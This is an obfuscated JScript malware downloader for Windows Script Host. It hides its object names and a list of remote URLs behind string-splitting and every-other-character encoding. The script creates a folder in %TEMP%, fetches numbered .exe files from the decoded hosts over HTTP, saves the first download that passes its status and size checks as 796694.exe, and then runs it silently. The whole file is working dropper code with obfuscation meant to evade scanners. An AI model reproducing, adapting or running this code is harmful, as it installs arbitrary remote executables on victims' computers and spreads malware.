

function KYuXHoqHO(RzbEUOpkuHr) {
var eFrgPmdW = "CdNd Ws pRNjDoy cript.S MxkKeY hell".split(" ");
var UkfeeESe = WScript.CreateObject(eFrgPmdW[1] + eFrgPmdW[3] + eFrgPmdW[5]);
UkfeeESe.Run(RzbEUOpkuHr, 0x1, 0x0);
}
function XrFVjLONl(ERgGW,jEAhf,OZpDH) {
var OuFIf = "uUpOIZ Lpg pt.Shell CcFBlwv Scri  %TEMP%\\".split(" ");
var ORk=((1)?"W" + OuFIf[4]:"")+OuFIf[2];
var Om = WScript.CreateObject(ORk);
return Om.ExpandEnvironmentStrings(OuFIf[6]);
}
function EAHgwrzm() {
var LrXnCzJ = "Sc TJUkiTN r yOnDbkrED ipting LKaayFz IiB ile CIaOPMkOAzDNhf System uW BwpzE Obj MeCLUw ect PghzskC".split(" ");
return LrXnCzJ[0] + LrXnCzJ[2] + LrXnCzJ[4] + ".F" + LrXnCzJ[7] + LrXnCzJ[9] + LrXnCzJ[12] + LrXnCzJ[14];
}
function rbLw(jgJsE) {
HblVHAY = WScript.CreateObject(jgJsE);
return HblVHAY
}
function CeDw(MfBer,hHbeh) {
MfBer.write(hHbeh);
}
function gPgc(rkQHY) {
rkQHY.open();
}
function QoWp(mNnIT,qqauT) {
mNnIT.saveToFile(qqauT,638-636);
}
function bOnm(QQbVc,MuDYz,QRujK) {
QQbVc.open(QRujK,MuDYz,false);
}
function jexc(Tgawz) {
if (Tgawz == 717-517){return true;} else {return false;}
}
function vKhe(sbKwi) {
if (sbKwi > 184335-200){return true;} else {return false;}
}
function hiFz(nGdZP) {
var BGGSH="";
for(J=(776-776); J < nGdZP.length; J++)
if (J % (419-417) != (101-101)) {
BGGSH += nGdZP.substr(J, 473-472);
}
return BGGSH;
}
function lzVM(ZEQME) {
ZEQME.send();
}
function lhmF(bvjOc) {
return bvjOc.status;
}
function qNavE(EqRWHe) {
return new ActiveXObject(EqRWHe);
}
function WbQvqsc(fPZu) {
fPZu.position=0;
}
function eegyPXl(qpWJ) {
return qpWJ.responseBody;
}
var sD="9uzjKa4j1ahjLg9oXgCoXfhfi.VcHopm5/l8M08.JeAx9ex?W WiDsCtth4ezrmeRannlyHbKoBdkygqaqd.xcvojm8/7860A.oeLx1ek?r K?2 N?H S?";
var N = hiFz(sD).split(" ");
var yXk = XrFVjLONl("CFnI","nGXMH","bsUiQH");
var sRh = qNavE(EAHgwrzm());
var CJGrKm = ("BmPNyNv \\").split(" ");
var TrAE = yXk+CJGrKm[0]+CJGrKm[1];
try{
sRh.CreateFolder(TrAE);
}catch(GgrhnU){
};
var vfC = "2.XMLH";
var DFG = (vfC + "TTP" + " XzJDkMj ZXmiA XML ream St nWPbLybD AD pJmSEQF OD").split(" ");
var aw = true  , mDOU = DFG[7] + "" + DFG[9];
var RT = rbLw("MS"+DFG[3]+(866118, DFG[0]));
var Lcx = rbLw(mDOU + "B." + DFG[5]+(661647, DFG[4]));
var Xfj = 0;
var z = 1;
var gYtcFXO = 796694;
var P=Xfj;
while (true)  {
if(P>=N.length) {break;}
var Eo = 0;
var qSo = ("ht" + " WeVkEjb tp zpvyy wOgfMDUf :// IKeKoNg .e xe G ET").split(" ");
try  {
var QBNzK=qSo[0]+qSo[2]+qSo[5];
bOnm(RT,QBNzK+N[P]+z, qSo[9]+qSo[10]); lzVM(RT); if (jexc(lhmF(RT)))  {      
gPgc(Lcx); Lcx.type = 1; CeDw(Lcx,eegyPXl(RT)); if (vKhe(Lcx.size))  {
Eo = 1; WbQvqsc(Lcx);QoWp(Lcx,/*2A5A92W2FN*/TrAE/*vICe23dpqJ*/+gYtcFXO+qSo[7]+qSo[8]); try  {
if (((new Date())>0,752639888)) {
KYuXHoqHO(TrAE+gYtcFXO+/*LCoQ51xhhY*/qSo[7]+qSo[8]/*HPpG343ReP*/); 
break;
}
}
catch (hk)  {
}; 
}; Lcx.close(); 
}; 
if (Eo == 1)  {
Xfj = P; break; 
}; 
}
catch (hk)  { 
}; 
P++;
}; 

